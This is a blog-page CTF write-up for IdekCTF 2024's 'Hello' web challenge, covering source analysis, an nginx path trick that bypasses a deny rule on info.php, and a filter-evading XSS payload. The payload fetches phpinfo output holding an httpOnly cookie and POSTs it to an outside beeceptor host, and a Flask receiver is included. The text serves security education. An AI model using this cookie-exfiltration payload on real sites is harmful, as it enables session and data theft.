<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>IdekCTF 24 - Hello | hxuu</title>
<meta name=keywords content="ctf,write-up,idekctf"><meta name=description content="CTF write-up for Hello"><meta name=author content="hxuu"><link rel=canonical href=https://hxuu.github.io/blog/ctf/idek24/hello/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.a9de69711750554b5ca1926546c46a763ce30e0caa50cf5d86499b3b035e42bf.css integrity="sha256-qd5pcRdQVUtcoZJlRsRqdjzjDgyqUM9dhkmbOwNeQr8=" rel="preload stylesheet" as=style><link rel=icon href=https://hxuu.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hxuu.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hxuu.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://hxuu.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://hxuu.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://hxuu.github.io/blog/ctf/idek24/hello/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hxuu.github.io/blog/ctf/idek24/hello/"><meta property="og:site_name" content="hxuu"><meta property="og:title" content="IdekCTF 24 - Hello"><meta property="og:description" content="CTF write-up for Hello"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2024-08-18T22:22:37+01:00"><meta property="article:modified_time" content="2024-08-18T22:22:37+01:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="Idekctf"><meta property="og:image" content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="IdekCTF 24 - Hello"><meta name=twitter:description content="CTF write-up for Hello"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Ctfs","item":"https://hxuu.github.io/blog/ctf/"},{"@type":"ListItem","position":2,"name":"IdekCTF 24 - Hello","item":"https://hxuu.github.io/blog/ctf/idek24/hello/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"IdekCTF 24 - Hello","name":"IdekCTF 24 - Hello","description":"CTF write-up for Hello","keywords":["ctf","write-up","idekctf"],"articleBody":"Challenge Description n c p c a a o t m t i f e e n - : g t d o s a h r : t e y e l : 1 : l 3 o w 6 A e u b g e 1 x 7 p t l h o , i t 2 a 0 t 2 i 4 o n Just to warm you up for the next Fight :“D\nNote: the admin bot is not on the same machine as the challenge itself and the .chal.idek.team:1337 URL should be used for the admin bot URL\nChallenge Analysis We’re given two links and a source code for the admin bot.\nchallenge link: http://idek-hello.chal.idek.team:1337 admin bot link: https://admin-bot.idek.team/idek-hello Since the admin bot is not on the same machine as the challenge, we should expect that the flag will be retrieved using a technique like XSS, CSRF…etc\nLet’s check out the challenge website:\nEmpty huh? Let’s take a look now at the admin bot page:\nApparently, we have a form that has a url section, we can submit a URL, and the admin bot will visit this URL for us. For example:\nu r l : h t t p : / / i d e k - h e l l o . c h a l . i d e k . t e a m : 1 3 3 7 Result:\nSince the ‘admin’ will visit our page, maybe the page that the admin was at contains information that we want, a FLAG cookie for example, but in order to verify my claim, we have to check the source code of the application. Luckily for us, the source code is available, and has the following structure:\n. ├── bot.js ├── docker-compose.yml └── hello ├── Dockerfile ├── init.sh ├── nginx.conf └── src ├── index.php └── info.php Alright, those are lots of files, let’s take a look at them in a way that will enable us to understand the logic of the application.\n1. Setting up services using Dockerfile \u0026 docker-compose.yml Here’s a summary of the Docker setup:\ndocker-compose.yml:\nDefines a hello service. Builds the Docker image using the hello directory. Maps host port 1337 to container port 80. Dockerfile:\nUses the latest Nginx image. Installs PHP-FPM and nano. Copies Nginx configuration, website files, and an initialization script into the container. Sets the initialization script (init.sh) as the command to run, which starts PHP-FPM and Nginx. The setup runs a web server with Nginx and PHP-FPM, accessible on port 1337 of the host machine, which maps to the challenge webpage.\n“PHP-FPM is an alternative PHP FastCGI implementation that was introduced to overcome the limitations of the traditional PHP-CGI (Common Gateway Interface). It works as a process manager, managing PHP processes and handling PHP requests separately from the web server”\n“Nginx is a web server that can also be used as a reverse proxy, load balancer, mail proxy…etc”\nIn a nutshell, nginx receives our request (from the browser..etc), processes the URL according to its configuration, if the path matches a php file, it passes the request to PHP-FPM for processing, receives a response and forwards the response back to us, effectively acting as a reverse proxy.\n2. How the application works a. the challenge webpage Let’s take a look at the the two php files under the src directory:\nindex.php \u003c?php function Enhanced_Trim($inp) { $trimmed = array(\"\\r\", \"\\n\", \"\\t\", \"/\", \" \"); return str_replace($trimmed, \"\", $inp); } if(isset($_GET['name'])) { $name = substr($_GET['name'], 0, 23); echo \"Hello, \" . Enhanced_Trim($_GET['name']); } ?\u003e Explanation: This PHP script greets the user based on the name parameter in the query string. It removes certain characters from the name using the Enhanced_Trim function and limits the length of $name to 23 characters.\ninfo.php \u003c?php phpinfo(); ?\u003e Explanation: This PHP script displays detailed information about the PHP configuration and environment on the server. It’s typically used for debugging and viewing PHP settings.\nInteresting, we can see that the name query parameter is reflected in the index.php page, which means we have XSS, albeit tweaked to fit the constraints imposed on us, but what is the purpose of info.php? Let’s find out.\n“phpinfo — Outputs information about PHP’s configuration”\nb. the bot webpage /* script revamped from corctf this does not match the remote setup exactly, which uses the redpwn admin bot this is just to facilitate local testing npm i puppeteer */ let puppeteer; const { parseArgs } = require(\"util\"); const options = { CHALLENGE_ORIGIN: { type: \"string\", short: \"c\", default: \"http://localhost:1337\" } }; let { values: { CHALLENGE_ORIGIN }, positionals: [ TARGET_URL ] } = parseArgs({ args: process.argv.slice(2), options, strict: false }); if (!TARGET_URL) { console.error(`\\ Usage: node bot.js [-c CHALLENGE_ORIGIN] TARGET_URL Arguments: TARGET_URL: the url that the admin bot will visit Options: CHALLENGE_ORIGIN: the origin where the challenge instance is hosted (default is http://localhost:1337) `); process.exit(1); } // visiting logic puppeteer = require(\"puppeteer\"); const sleep = d =\u003e new Promise(r =\u003e setTimeout(r, d)); const visit = async () =\u003e { let browser; try { browser = await puppeteer.launch({ headless: true, pipe: true, args: [ \"--no-sandbox\", \"--disable-setuid-sandbox\", \"--js-flags=--noexpose_wasm,--jitless\", ], dumpio: true }); const ctx = await browser.createBrowserContext(); const page = await ctx.newPage(); await page.goto(CHALLENGE_ORIGIN, { timeout: 3000 }); await page.setCookie({ name: 'FLAG', value: 'idek{PLACEHOLDER}', httpOnly: true }); await page.goto(TARGET_URL, { timeout: 3000, waitUntil: 'domcontentloaded' }); await sleep(5000); await browser.close(); browser = null; } catch (err) { console.log(err); } finally { if (browser) await browser.close(); } }; visit(); The script uses Puppeteer to:\nLaunch a headless browser. Visit a specified CHALLENGE_ORIGIN URL. Set an HTTP-only cookie named FLAG. Navigate to a TARGET_URL. Wait for 5 seconds. Close the browser. It should be noted that during the CTF, CHALLENGE_ORIGIN was set to the challenge URL. With that out of the way, it becomes very clear, that the FLAG is set as an httpOnly cookie (can’t be accessed via document.Cookie), then the bot navigates to a TARGET_URL of our choice and closes the browser.\nOur goal here is to retrieve the FLAG, but how?\nExploit Remember the info.php page we seemed to not know what it was for? Well, it turns out that phpinfo() shows all cookies, even the httponly ones, so if we can visit the /info.php page as the admin bot and retrieve its content to our local server, we will get the flag.\nNot so fast though… Access to /info.php is denied by the following rule in the nginx configuration:\nl } o c a t a d i l e o l n n o y w = a 1 l / 2 l i 7 ; n . f 0 o . . 0 p . h 1 p ; { Nginx denies access to an exact location /info.php. If we navigate to something like /info.php/whatever.php, PHP-FPM processes the first php file and ignores subsequent files. This is called an HTTP Desync attack, which arises from the subtle discrepancies in which two technologies handle HTTP requests. Let’s try it out:\nThere we go! We bypassed the nginx rule, all there is left is creating an XSS payload which adheres to the constraints, visits the /info.php page and send its content to us the attacker.\nExploit - continued Before we craft the XSS payload, let’s first write the JS code which will be injected. It should look like this:\nfetch('http://idek-hello.chal.idek.team:1337/info.php/whatever.php') .then(response =\u003e response.text()) .then(data =\u003e { return fetch('https://qtcbb221a681bbd53187f7c03c5c.free.beeceptor.com/save', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: data }) }); }) The script is simple enough, we first fetch the info page, with its response captured, we send it to our hosted server (I used beeceptor to tunnel my localhost) and retrieve the flag.\nThe server in case you are wondering looks something like this (written in flask):\nfrom flask import Flask, request, jsonify app = Flask(__name__) @app.route('/save', methods=['POST']) def save(): data = request.json content = data.get('content', '') # Save the content to a file with open('out.html', 'w') as f: f.write(content) return jsonify({'status': 'success', 'message': 'Content saved!'}) if __name__ == '__main__': app.run(port=5000, debug=True) Alright, the last step now, how can we create the XSS payload. Let’s review the constraints:\nNo \\n No \\r No \\t No / No (space) Well that seems hard eh? we can bypass the forward slash contraint using a simple\n\u003csvg onload=\"eval(atob(''))\"\u003e But how about the space?\nReverting back to Wikipedia, my source of information (kudos if you get the joke), we see there exists a Form feed character (ASCII 12) - (0xC in HEX), that is considered whitespace by the C character classification function isspace().\nCool, let’s modify the payload to look like this:\n\u003csvg%0Conload=\"eval(atob(''))\"\u003e Lastly, to deliver the exploit, we just have to send the payload as a query parameter for name, just like this:\nhttp://idek-hello.chal.idek.team:1337/?name=\u003csvg%0Conload=\"eval(atob('ZmV0Y2goJ2h0dHA6Ly9pZGVrLWhlbGxvLmNoYWwuaWRlay50ZWFtOjEzMzcvaW5mby5waHAvaW5k ZXgucGhwJykudGhlbihyPT5yLnRleHQoKSkudGhlbihkPT5mZXRjaCgnaHR0cHM6Ly9xdDFlYTY4 M2EzNjhkYzY1ZDc2YTExM2Y3NGZiLmZyZWUuYmVlY2VwdG9yLmNvbS9zYXZlJywge21ldGhvZDon UE9TVCcsaGVhZGVyczp7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfSxib2R5OkpT T04uc3RyaW5naWZ5KHtjb250ZW50OmR9KX0pKQ=='))\"\u003e Click on submit…\nThere we go~\nFlag is: idek{Ghazy_N3gm_Elbalad}\nThings learned in this challenge:\nAlways use regular expressions to match pathnames. Form feed character can be used as a whitespace inside html tags. Some scripting skills ","wordCount":"1505","inLanguage":"en","image":"https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-08-18T22:22:37+01:00","dateModified":"2024-08-18T22:22:37+01:00","author":{"@type":"Person","name":"hxuu"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hxuu.github.io/blog/ctf/idek24/hello/"},"publisher":{"@type":"Organization","name":"hxuu","logo":{"@type":"ImageObject","url":"https://hxuu.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hxuu.github.io/blog/ accesskey=h title="hxuu (Alt + H)"><img src=https://hxuu.github.io/apple-touch-icon.png alt aria-label=logo height=35>hxuu</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hxuu.github.io/blog/ctf/ title=CTFs><span>CTFs</span></a></li><li><a href=https://hxuu.github.io/blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://hxuu.github.io/blog/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://github.com/hxuu title="About Me"><span>About Me</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://hxuu.github.io/blog/>Home</a>&nbsp;»&nbsp;<a href=https://hxuu.github.io/blog/ctf/>Ctfs</a></div><h1 class="post-title entry-hint-parent">IdekCTF 24 - Hello</h1><div class=post-description>CTF write-up for Hello</div><div class=post-meta><span title='2024-08-18 22:22:37 +0100 +0100'>August 18, 2024</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;hxuu&nbsp;|&nbsp;<a href=https://github.com/hxuu/content/ctf/idek24/hello.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#challenge-description>Challenge Description</a></li><li><a href=#challenge-analysis>Challenge Analysis</a><ul><li><a href=#1-setting-up-services-using-dockerfile--docker-composeyml>1. Setting up services using Dockerfile & docker-compose.yml</a></li><li><a href=#2-how-the-application-works>2. How the application works</a></li><li><a href=#indexphp><code>index.php</code></a></li><li><a href=#infophp><code>info.php</code></a></li></ul></li><li><a href=#exploit>Exploit</a></li><li><a href=#exploit---continued>Exploit - continued</a></li></ul></nav></div></details></div><div class=post-content><h2 id=challenge-description>Challenge Description<a hidden class=anchor aria-hidden=true href=#challenge-description>#</a></h2><div class="goat svg-container"><svg font-family="Menlo,Lucida Console,monospace" viewBox="0 0 216 73"><g transform="translate(8,16)"><text text-anchor="middle" x="0" y="4" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="0" y="20" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="0" y="36" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="0" y="52" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="8" y="4" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="8" y="20" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="8" y="36" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="8" y="52" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="16" y="4" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="16" y="20" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="16" y="36" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="16" y="52" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="24" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="24" y="20" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="24" y="36" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="24" y="52" fill="currentcolor" style="font-size:1em">-</text><text text-anchor="middle" x="32" y="4" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="32" y="20" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="32" y="36" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="32" y="52" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="40" y="20" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="40" y="36" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="40" y="52" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="48" y="4" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="48" y="20" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="48" y="36" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="48" y="52" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="56" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="56" y="20" fill="currentcolor" style="font-size:1em">y</text><text text-anchor="middle" x="56" y="52" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="64" y="4" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="64" y="20" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="64" y="36" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="64" y="52" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="72" y="4" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="72" y="36" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="80" y="4" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="80" y="20" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="80" y="36" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="80" y="52" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="88" y="20" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="88" y="52" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="96" y="20" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="96" y="52" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="112" y="20" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="112" y="52" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="120" y="20" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="120" y="52" fill="currentcolor" style="font-size:1em">7</text><text text-anchor="middle" x="128" y="20" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="128" y="52" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="136" y="20" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="136" y="52" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="144" y="20" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="144" y="52" fill="currentcolor" style="font-size:1em">,</text><text text-anchor="middle" x="152" y="20" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="160" y="20" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="160" y="52" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="168" y="20" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="168" y="52" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="176" y="20" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="176" y="52" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="184" y="20" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="184" y="52" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="192" y="20" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="200" y="20" fill="currentcolor" style="font-size:1em">n</text></g></svg></div><p>Just to warm you up for the next Fight :&ldquo;D</p><p>Note: the admin bot is not on the same machine as the challenge itself and the .chal.idek.team:1337 URL should be used for the admin bot URL</p><h2 id=challenge-analysis>Challenge Analysis<a hidden class=anchor aria-hidden=true href=#challenge-analysis>#</a></h2><p>We&rsquo;re given two links and a source code for the admin bot.</p><ol><li>challenge link: <a href=http://idek-hello.chal.idek.team:1337>http://idek-hello.chal.idek.team:1337</a></li><li>admin bot link: <a href=https://admin-bot.idek.team/idek-hello>https://admin-bot.idek.team/idek-hello</a></li></ol><p>Since the admin bot is not on the same machine as the challenge, we should expect
that the flag will be retrieved using a technique like XSS, CSRF&mldr;etc</p><p>Let&rsquo;s check out the challenge website:</p><p><img alt=challenge-initial loading=lazy src=/blog/images/2024-08-18-22-29-45.png></p><p>Empty huh? Let&rsquo;s take a look now at the admin bot page:</p><p><img alt=admin-initial loading=lazy src=/blog/images/2024-08-18-22-30-55.png></p><p>Apparently, we have a form that has a url section, we can submit a URL, and the admin bot
will visit this URL for us. For example:</p><div class="goat svg-container"><svg font-family="Menlo,Lucida Console,monospace" viewBox="0 0 344 25"><g transform="translate(8,16)"><text text-anchor="middle" x="0" y="4" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="8" y="4" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="16" y="4" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="24" y="4" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="40" y="4" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="48" y="4" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="56" y="4" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="64" y="4" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="72" y="4" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="80" y="4" fill="currentcolor" style="font-size:1em">/</text><text text-anchor="middle" x="88" y="4" fill="currentcolor" style="font-size:1em">/</text><text text-anchor="middle" x="96" y="4" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="104" y="4" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="112" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="120" y="4" fill="currentcolor" style="font-size:1em">k</text><text text-anchor="middle" x="128" y="4" fill="currentcolor" style="font-size:1em">-</text><text text-anchor="middle" x="136" y="4" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="144" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="152" y="4" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="160" y="4" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="168" y="4" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="176" y="4" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="184" y="4" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="192" y="4" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="200" y="4" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="208" y="4" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="216" y="4" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="224" y="4" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="232" y="4" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="240" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="248" y="4" fill="currentcolor" style="font-size:1em">k</text><text text-anchor="middle" x="256" y="4" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="264" y="4" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="272" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="280" y="4" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="288" y="4" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="296" y="4" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="304" y="4" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="312" y="4" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="320" y="4" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="328" y="4" fill="currentcolor" style="font-size:1em">7</text></g></svg></div><p>Result:</p><p><img alt=admin-visiting loading=lazy src=/blog/images/2024-08-18-22-33-18.png></p><p>Since the &lsquo;admin&rsquo; will visit our page, maybe the page that the admin was at contains
information that we want, a FLAG cookie for example, but in order to verify my claim,
we have to check the source code of the application. Luckily for us, the source code is
available, and has the following structure:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>├── bot.js
</span></span><span class=line><span class=cl>├── docker-compose.yml
</span></span><span class=line><span class=cl>└── hello
</span></span><span class=line><span class=cl>    ├── Dockerfile
</span></span><span class=line><span class=cl>    ├── init.sh
</span></span><span class=line><span class=cl>    ├── nginx.conf
</span></span><span class=line><span class=cl>    └── src
</span></span><span class=line><span class=cl>        ├── index.php
</span></span><span class=line><span class=cl>        └── info.php
</span></span></code></pre></div><p>Alright, those are lots of files, let&rsquo;s take a look at them in a way that will enable
us to understand the logic of the application.</p><h3 id=1-setting-up-services-using-dockerfile--docker-composeyml>1. Setting up services using Dockerfile & docker-compose.yml<a hidden class=anchor aria-hidden=true href=#1-setting-up-services-using-dockerfile--docker-composeyml>#</a></h3><p>Here&rsquo;s a summary of the Docker setup:</p><ul><li><p><strong><code>docker-compose.yml</code></strong>:</p><ul><li>Defines a <code>hello</code> service.</li><li>Builds the Docker image using the <code>hello</code> directory.</li><li>Maps host port <code>1337</code> to container port <code>80</code>.</li></ul></li><li><p><strong><code>Dockerfile</code></strong>:</p><ul><li>Uses the latest Nginx image.</li><li>Installs PHP-FPM and <code>nano</code>.</li><li>Copies Nginx configuration, website files, and an initialization script into the container.</li><li>Sets the initialization script (<code>init.sh</code>) as the command to run, which starts PHP-FPM and Nginx.</li></ul></li></ul><p>The setup runs a web server with Nginx and PHP-FPM, accessible on port <code>1337</code> of the host machine,
which maps to the challenge webpage.</p><blockquote><p>&ldquo;PHP-FPM is an alternative PHP FastCGI implementation that was introduced to overcome the limitations of the traditional PHP-CGI (Common Gateway Interface). It works as a process manager, managing PHP processes and handling PHP requests separately from the web server&rdquo;</p></blockquote><blockquote><p>&ldquo;Nginx is a web server that can also be used as a reverse proxy, load balancer, mail proxy&mldr;etc&rdquo;</p></blockquote><p>In a nutshell, nginx receives our request (from the browser..etc), processes the URL
according to its configuration, if the path matches a php file, it passes the request
to PHP-FPM for processing, receives a response and forwards the response back to us,
effectively acting as a reverse proxy.</p><h3 id=2-how-the-application-works>2. How the application works<a hidden class=anchor aria-hidden=true href=#2-how-the-application-works>#</a></h3><h4 id=a-the-challenge-webpage>a. the challenge webpage<a hidden class=anchor aria-hidden=true href=#a-the-challenge-webpage>#</a></h4><p>Let&rsquo;s take a look at the the two php files under the src directory:</p><h3 id=indexphp><code>index.php</code><a hidden class=anchor aria-hidden=true href=#indexphp>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>Enhanced_Trim</span><span class=p>(</span><span class=nv>$inp</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$trimmed</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\t</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;/&#34;</span><span class=p>,</span> <span class=s2>&#34; &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>str_replace</span><span class=p>(</span><span class=nv>$trimmed</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=nv>$inp</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$name</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>],</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>23</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Hello, &#34;</span> <span class=o>.</span> <span class=nx>Enhanced_Trim</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
